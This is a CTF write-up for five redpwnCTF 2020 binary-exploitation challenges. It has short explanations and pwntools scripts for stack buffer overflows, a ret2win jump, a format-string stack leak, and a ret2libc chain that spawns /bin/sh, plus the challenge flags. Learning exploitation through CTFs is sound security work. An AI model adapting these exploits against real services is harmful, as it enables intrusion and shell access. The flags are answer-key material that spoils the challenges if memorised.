# coffer-overflow-0  
> Can you fill up the coffers? We even managed to find the source for you.  
> nc 2020.redpwnc.tf 31199  

just send a string with very long character and it will overflow the value of variable code.  
flag : `flag{b0ffer_0verf10w_3asy_as_123}`  

# coffer-overflow-1  
> The coffers keep getting stronger! You'll need to use the source, Luke.  
> nc 2020.redpwnc.tf 31255  

this time we need to actually control a value, this can be done by filling the buffer until 8 bytes before rbp and fill the 8 bytes with value `0xcafebabe`  
```python
import pwn

r = pwn.remote("2020.redpwnc.tf", 31255)
# r = pwn.process("coffer-overflow-1")
payload = "A"*24 + pwn.p64(0xcafebabe)
r.sendline(payload)
r.interactive()
```
flag : `flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}`    

# coffer-overflow-2  
> You'll have to jump to a function now!?  
> nc 2020.redpwnc.tf 31908  

this time we need to jump into `binFunction` function, this can be done by filling the buffer until it hit rbp and overflow the buffer with `binFunction` address  
```python
import pwn

pad = "A" * 16
win = pwn.p64(0x00000000004006e6)
ret = pwn.p64(0x000000000040053e)
payload = pad+ret+win

r = pwn.remote("2020.redpwnc.tf", 31908)
r.sendline(payload)
r.interactive()
```
flag : `flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}`  

# secret-flag  
> There's a super secret flag in printf that allows you to LEAK the data at an address??  
> nc 2020.redpwnc.tf 31826  
if you look at the program on your dissasembler, you can see that our input become an argument on the printf function, however the program didn't call the printf properly, so we can input the string format `%s` and it will print a string somewhere from the stack, to control it simply do `%n$s` and it will print a random nth string somewhere from the stack.  
```python
import pwn

response = ""
i = 1
while 'flag' not in response:
	# print(i)
	print("%"+str(i)+"$s")
	try:
		r = pwn.remote("2020.redpwnc.tf", 31826)
		r.sendlineafter("adventurer?\n","%"+str(i)+"$s")
		response = r.recv().decode()
		print(response)
		i += 1
		r.close()
	except:
		pass
print(response)
```
flag : `flag{n0t_s0_s3cr3t_f1ag_n0w}`

# the-library  
> There's not a lot of useful functions in the binary itself. I wonder where you can get some...  
> nc 2020.redpwnc.tf 31350  
This is a ret2libc challenge, I got the code and explanation [here](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)  
So basically we want to pop the value /bin/sh into RDI, the call system, system will read what to execute from RDI, thus executes /bin/sh
```python
from pwn import * 
p = remote("2020.redpwnc.tf", 31350)
elf = ELF("./the-library")
libc = ELF("libc.so.6")
payload = ROP(elf)

pop_rdi = (payload.find_gadget(['pop rdi', 'ret']))[0]
libc_start_main = elf.symbols['__libc_start_main']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
ret = (payload.find_gadget(['ret']))[0]
pad = "A"*16 + "B"*8
payload = pad + p64(pop_rdi) + p64(libc_start_main) +  p64(puts_plt) + p64(main)

p.sendlineafter("?\n", payload)
p.recvline()
p.recvline()

leak = p.recvline().strip()
leak = u64(leak.ljust(8, "\x00"))
libc.address = leak - libc.sym["__libc_start_main"]
bin_sh = next(libc.search("/bin/sh")) 
system = libc.sym["system"]
payload = pad + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

p.sendlineafter("?\n", payload)
p.interactive()
```  
flag : `flag{jump_1nt0_th3_l1brary}`